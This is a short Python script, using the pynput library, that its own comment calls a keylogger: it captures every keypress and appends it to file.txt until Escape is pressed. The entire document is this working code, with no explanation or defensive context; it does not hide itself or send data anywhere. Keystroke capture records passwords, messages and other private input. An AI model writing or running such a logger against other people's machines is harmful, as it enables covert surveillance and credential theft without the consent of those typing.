import time
from pynput.keyboard import Listener,Key
#Press escape to exit the keylogger
def pressed(key):
    if key == Key.esc:
        return False
    with open("file.txt","a") as f:
        f.write(str(key))
with Listener(on_press=pressed) as listener:
    listener.join()